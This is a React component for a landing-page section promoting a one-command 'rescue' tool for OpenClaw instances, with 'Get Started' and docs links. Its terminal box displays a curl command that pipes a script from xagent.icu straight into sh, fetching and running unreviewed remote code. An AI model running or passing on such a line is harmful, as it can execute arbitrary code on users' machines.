import { BookOpen, Terminal } from "lucide-react";

export function CTASection() {
  return (
    <section id="get-started" className="relative mx-auto w-full max-w-[860px] px-6 py-24">
      <div className="reveal">
        <div className="relative overflow-hidden rounded-3xl border border-border/30 bg-gradient-to-br from-surface/80 to-surface/40 p-12 text-center backdrop-blur-xl">
          <div className="absolute -left-32 -top-32 h-64 w-64 rounded-full bg-[#ff4d4d]/20 blur-[100px]" />
          <div className="absolute -bottom-32 -right-32 h-64 w-64 rounded-full bg-[#00e5cc]/15 blur-[100px]" />
          
          <div className="relative z-10">
            <h2 className="font-heading text-3xl font-bold tracking-tight text-foreground sm:text-4xl">
              Ready to Rescue Your OpenClaw?
            </h2>
            <p className="mx-auto mt-4 max-w-xl text-muted-foreground">
              One command to diagnose, repair, and revive your OpenClaw instance. No more manual debugging.
            </p>
            
            <div className="mt-8 flex flex-wrap items-center justify-center gap-4">
              <a
                href="/rescue"
                className="rounded-xl bg-primary px-8 py-3.5 text-sm font-semibold text-background shadow-lg shadow-[rgba(255,77,77,0.25)] transition-all hover:shadow-[rgba(255,77,77,0.4)] hover:scale-[1.02]"
              >
                Get Started Now
              </a>
              <a
                href="/docs"
                className="group flex items-center gap-2 rounded-xl border border-border bg-card backdrop-blur-[12px] px-6 py-3 text-sm font-medium text-foreground transition-all hover:border-border/50 hover:bg-surface"
              >
                <BookOpen className="h-4 w-4 text-muted-foreground transition-colors group-hover:text-foreground" />
                Read the Docs
              </a>
            </div>
            
            <div className="mt-8 inline-flex items-center gap-2 rounded-lg bg-terminal px-4 py-2 font-mono text-xs text-muted-foreground ring-1 ring-[rgba(255,77,77,0.3)]">
              <Terminal className="h-3 w-3" />
              curl -fsSL https://xagent.icu/r | sh
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
